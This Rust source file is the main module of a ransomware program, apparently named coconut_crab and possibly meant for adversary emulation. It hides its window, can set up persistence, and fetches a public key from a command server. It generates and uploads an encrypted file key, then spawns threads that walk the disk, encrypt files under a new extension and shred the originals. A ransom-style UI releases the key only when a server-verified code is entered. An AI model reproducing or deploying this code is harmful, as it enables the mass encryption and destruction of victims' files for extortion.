#![cfg_attr(
    all(target_os = "windows", not(debug_assertions)),
    windows_subsystem = "windows"
)]
#![allow(clippy::similar_names)]

use hex::encode;
use log::{debug, error, info, warn};
use std::{
    env,
    sync::{
        Arc,
        atomic::{AtomicU64, Ordering},
    },
    thread,
};
use zeroize::Zeroize;

use coconut_crab_lib::file::get_exe_path_dir;

mod persist;
use persist::{start_persist, stop_persist};

mod crypto;
use crypto::{decrypt, encrypt, encrypt_string, encrypt_sym_key, generate_sym_key, record};

mod walker;
use walker::{random_walk, walk, walk_with_exts};

mod comm;
use comm::{
    announce_completion, download_asym_pub_key, get_sym_key, upload_sym_key,
    write_asym_pub_key_to_disk,
};

mod status;
use status::export_status_csv;

mod shredder;
use shredder::shred;

mod client;
use client::{get_thread_nums, initialize_client};

mod img;
use img::set_icon_wallpaper;

mod canary;
use canary::filter_canary;

mod ui;
use ui::{callback_handler_init, set_window_icon};

#[macro_use]
extern crate litcrypt2;
extern crate alloc;
use_litcrypt!();

slint::include_modules!();

mod config;

fn main() {
    if cfg!(debug_assertions) {
        env_logger::Builder::new()
            .filter_level(log::LevelFilter::Debug)
            .init();
    } else {
        env_logger::Builder::new()
            .filter_level(log::LevelFilter::Off)
            .init();
    }

    let server_fqdn = config::SERVER_FQDN.as_str();
    let preshared_secret = config::PRESHARED_SECRET.as_str();

    if config::PERSIST {
        debug!("Establishing persistence");
        start_persist();
    }

    let exe_path_dir = get_exe_path_dir();
    let mut status = initialize_client(
        &exe_path_dir,
        server_fqdn,
        config::SERVER_PORT,
        preshared_secret,
        config::HTTPS,
        config::VERIFY_SERVER,
    );
    let num_threads = get_thread_nums();

    let mut sym_key = [0u8; 32];
    let counter = AtomicU64::new(0);

    if !status.encryption_complete {
        debug!("Encryption not previously completed");

        debug!("Starting key operations");
        if status.encryption_started {
            debug!("Encryption previously started");

            debug!("Starting key retrieval");
            sym_key = if let Some(key) = get_sym_key(
                server_fqdn,
                config::SERVER_PORT,
                &status,
                &lc!("0000-0000-0000-0000"),
                preshared_secret,
                config::HTTPS,
                config::VERIFY_SERVER,
            ) {
                key
            } else {
                debug!("Unable to retrieve key. Marking encryption complete.");
                status.encryption_complete = true;
                [0u8; 32]
            };
        } else {
            debug!("Encryption not previously started");
            generate_sym_key(&mut sym_key);

            let asym_pub_key = download_asym_pub_key(
                server_fqdn,
                config::SERVER_PORT,
                config::HTTPS,
                config::VERIFY_SERVER,
            );
            debug!("Got asymmetric public key: {asym_pub_key:?}");

            if config::SAVE_PUBLIC_KEY_TO_DISK {
                debug!("Saving asymmetric public key to disk");
                write_asym_pub_key_to_disk(&asym_pub_key, &exe_path_dir.join("asym-pub-key.pem"));
            }

            status.asymmetrically_encrypted_symmetric_key =
                encrypt_sym_key(&asym_pub_key, &sym_key);
            debug!(
                "Encrypted symmetric key: {}",
                status.asymmetrically_encrypted_symmetric_key
            );

            upload_sym_key(
                server_fqdn,
                config::SERVER_PORT,
                &status,
                preshared_secret,
                config::HTTPS,
                config::VERIFY_SERVER,
            );
            debug!("Uploaded encrypted symmetric key");

            let nonce = counter.fetch_add(1, Ordering::Relaxed);
            debug!("Nonce value after increment: {nonce}");

            let mut full_nonce_bytes: [u8; 12] = [0u8; 12];
            full_nonce_bytes[0..8].copy_from_slice(&nonce.to_le_bytes());
            debug!("Nonce value after padding: {full_nonce_bytes:?}");

            status.symmetrically_encrypted_id_nonce = encode(full_nonce_bytes);
            status.symmetrically_encrypted_id =
                encrypt_string(&status.id, &sym_key, &full_nonce_bytes);
            debug!(
                "Added symmetrically encrypted id ({}) and nonce ({}) to status",
                status.symmetrically_encrypted_id, status.symmetrically_encrypted_id_nonce
            );
        }

        export_status_csv(&exe_path_dir, &status);
        debug!("Updated status CSV");
    }

    let sym_key_arc = Arc::new(sym_key);
    let counter_arc = Arc::new(counter);
    let encrypted_extension = config::ENCRYPTED_EXTENSION.to_string();
    let encrypted_extension_arc = Arc::new(encrypted_extension.clone());
    let wait_time_arc = Arc::new(config::WAIT_TIME);
    let jitter_time_arc = Arc::new(config::JITTER_TIME);
    let exe_path_dir_arc = Arc::new(exe_path_dir);

    if !status.encryption_complete {
        debug!("Starting encryption process");

        status.encryption_started = true;
        export_status_csv(exe_path_dir_arc.as_ref(), &status);
        debug!("Updated status CSV");

        let cap = |consumers: usize| -> usize { std::cmp::max(consumers * 2, 64) };
        let (channel_a_sender, channel_a_receiver) =
            crossbeam_channel::bounded(cap(num_threads.encrypt_threads));
        let mut thread_handles = Vec::new();

        if config::RANDOM_ORDER {
            for _ in 0..num_threads.walk_threads {
                thread_handles.push(random_walk(channel_a_sender.clone()));
                debug!("Spawned random walk thread");
            }
        } else {
            for _ in 0..num_threads.walk_threads {
                thread_handles.push(walk(channel_a_sender.clone()));
                debug!("Spawned walk thread");
            }
        }
        drop(channel_a_sender);
        debug!(
            "All walk threads spawned. {} total threads spawned.",
            thread_handles.len()
        );

        let (channel_c_sender, channel_c_receiver) =
            crossbeam_channel::bounded(cap(num_threads.shred_threads));

        if config::ANALYZE_PDF || config::ANALYZE_OFFICE_ZIP || config::AVOID_BROKEN_IMAGES {
            debug!("Canary mode enabled");

            let (channel_b_sender, channel_b_receiver) =
                crossbeam_channel::bounded(cap(num_threads.encrypt_threads_canary));

            for thread_num in 0..num_threads.canary_threads {
                thread_handles.push(filter_canary(
                    channel_a_receiver.clone(),
                    channel_b_sender.clone(),
                ));
                debug!("Spawned canary filter thread {thread_num}");
            }
            drop(channel_a_receiver);
            drop(channel_b_sender);
            debug!(
                "All canary threads spawned. {} total threads spawned.",
                thread_handles.len()
            );

            if config::ANALYZE_MODE {
                debug!("Analyze mode enabled");
                thread_handles.push(record(channel_b_receiver.clone(), exe_path_dir_arc.clone()));
                debug!("Spawned analysis thread");
                drop(channel_b_receiver);
                debug!(
                    "All analysis threads spawned. {} total threads spawned.",
                    thread_handles.len()
                );
                drop(channel_c_sender);
                drop(channel_c_receiver);
            } else {
                for thread_num in 0..num_threads.encrypt_threads_canary {
                    thread_handles.push(encrypt(
                        channel_b_receiver.clone(),
                        channel_c_sender.clone(),
                        sym_key_arc.clone(),
                        counter_arc.clone(),
                        encrypted_extension_arc.clone(),
                        wait_time_arc.clone(),
                        jitter_time_arc.clone(),
                    ));
                    debug!("Spawned encryption thread {thread_num}");
                }
                debug!(
                    "All encryption threads spawned. {} total threads spawned.",
                    thread_handles.len()
                );
                drop(channel_b_receiver);
                drop(channel_c_sender);

                for thread_num in 0..num_threads.shred_threads {
                    thread_handles.push(shred(channel_c_receiver.clone()));
                    debug!("Spawned shred thread {thread_num}");
                }
                drop(channel_c_receiver);
                debug!(
                    "All shred threads spawned. {} total threads spawned.",
                    thread_handles.len()
                );
            }
        } else if config::ANALYZE_MODE {
            debug!("Analyze mode enabled");
            thread_handles.push(record(channel_a_receiver.clone(), exe_path_dir_arc.clone()));
            debug!("Spawned analysis thread");
            debug!(
                "All analysis threads spawned. {} total threads spawned.",
                thread_handles.len()
            );
            drop(channel_a_receiver);
            drop(channel_c_sender);
            drop(channel_c_receiver);
        } else {
            for thread_num in 0..num_threads.encrypt_threads {
                thread_handles.push(encrypt(
                    channel_a_receiver.clone(),
                    channel_c_sender.clone(),
                    sym_key_arc.clone(),
                    counter_arc.clone(),
                    encrypted_extension_arc.clone(),
                    wait_time_arc.clone(),
                    jitter_time_arc.clone(),
                ));
                debug!("Spawned encryption thread {thread_num}");
            }
            debug!(
                "All encryption threads spawned. {} total threads spawned.",
                thread_handles.len()
            );
            drop(channel_a_receiver);
            drop(channel_c_sender);

            for thread_num in 0..num_threads.shred_threads {
                thread_handles.push(shred(channel_c_receiver.clone()));
                debug!("Spawned shred thread {thread_num}");
            }
            drop(channel_c_receiver);
            debug!(
                "All shred threads spawned. {} total threads spawned.",
                thread_handles.len()
            );
        }

        for handle in thread_handles {
            debug!("Joining thread: {handle:?}");
            handle.join().expect("Thread panicked");
        }

        status.encryption_complete = true;
        debug!("Encryption complete");
        export_status_csv(exe_path_dir_arc.as_ref(), &status);
        debug!("Updated status CSV");

        announce_completion(
            server_fqdn,
            config::SERVER_PORT,
            &status,
            preshared_secret,
            config::HTTPS,
            config::VERIFY_SERVER,
        );
        debug!("Announced completion");
    }

    sym_key.zeroize();
    debug!("Cleared symmetric key from memory");

    let decryption_operation = move |sym_key: [u8; 32]| {
        let (s3, r3) =
            crossbeam_channel::bounded(std::cmp::max(num_threads.decrypt_threads * 2, 64));
        let mut thread_handles = Vec::new();

        for _ in 0..num_threads.walk_threads {
            debug!("Spawning walk thread for decryption");
            thread_handles.push(walk_with_exts(
                s3.clone(),
                Some(vec![encrypted_extension.clone()]),
                None,
            ));
        }
        drop(s3);
        debug!(
            "All walk threads spawned. {} total threads spawned.",
            thread_handles.len()
        );

        let sym_key_arc = Arc::new(sym_key);
        for thread_num in 0..num_threads.decrypt_threads {
            thread_handles.push(decrypt(r3.clone(), sym_key_arc.clone()));
            debug!("Spawned decryption thread {thread_num}");
        }
        drop(r3);
        debug!(
            "All decryption threads spawned. {} total threads spawned.",
            thread_handles.len()
        );

        for handle in thread_handles {
            debug!("Joining thread: {handle:?}");
            handle.join().expect("Thread panicked");
        }
    };

    if config::SET_WALLPAPER {
        set_icon_wallpaper();
    }

    let ui = Main::new().expect("Failed to create Slint UI");
    set_window_icon(&ui);
    callback_handler_init(&ui);

    let ui_handle = ui.as_weak();
    let (s_decrypt, r_decrypt) = crossbeam_channel::bounded(1);
    let decryption_handler = move || {
        debug!("Initializing decryption handler thread");
        loop {
            let code: Arc<String> = match r_decrypt.recv() {
                Ok(key) => {
                    debug!("Received code over channel: {key:?}");
                    key
                }
                Err(error) => {
                    warn!("Error receiving code over channel: {error}");
                    return;
                }
            };

            debug!("Requesting symmetric key using user provided code");
            let Some(sym_key) = get_sym_key(
                server_fqdn,
                config::SERVER_PORT,
                &status,
                &code,
                preshared_secret,
                config::HTTPS,
                config::VERIFY_SERVER,
            ) else {
                if ui_handle
                    .upgrade_in_event_loop(move |handle| {
                        handle.set_status_text("Code failed verification".into());
                    })
                    .is_err()
                {
                    error!("Failed to upgrade UI handle");
                }
                if ui_handle
                    .upgrade_in_event_loop(move |handle| handle.set_status_progress(false))
                    .is_err()
                {
                    error!("Failed to upgrade UI handle");
                }
                return;
            };

            info!("Starting decryption");
            if ui_handle
                .upgrade_in_event_loop(move |handle| {
                    handle.set_status_text("Code successfully verified. Decrypting...".into());
                })
                .is_err()
            {
                error!("Failed to upgrade UI handle");
            }

            decryption_operation(sym_key);

            info!("Decryption complete");
            if ui_handle
                .upgrade_in_event_loop(move |handle| {
                    handle.set_status_text("Decryption complete".into());
                })
                .is_err()
            {
                error!("Failed to upgrade UI handle");
            }
            if ui_handle
                .upgrade_in_event_loop(move |handle| handle.set_status_progress(false))
                .is_err()
            {
                error!("Failed to upgrade UI handle");
            }

            if config::PERSIST {
                debug!("Ending persistence");
                stop_persist();
            }
        }
    };

    let ui_handle = ui.as_weak();
    ui.on_try_decrypt(move || {
        let ui = ui_handle.unwrap();

        let code = ui.get_code().to_string();
        info!("Verifying code: {code}");

        ui.set_status_text("Verifying code...".into());
        ui.set_status_progress(true);

        thread::spawn(decryption_handler.clone());

        s_decrypt
            .send(Arc::new(code))
            .expect("Failed to send code to decryption handler thread");
    });

    ui.run().expect("Failed to run Slint UI");
}
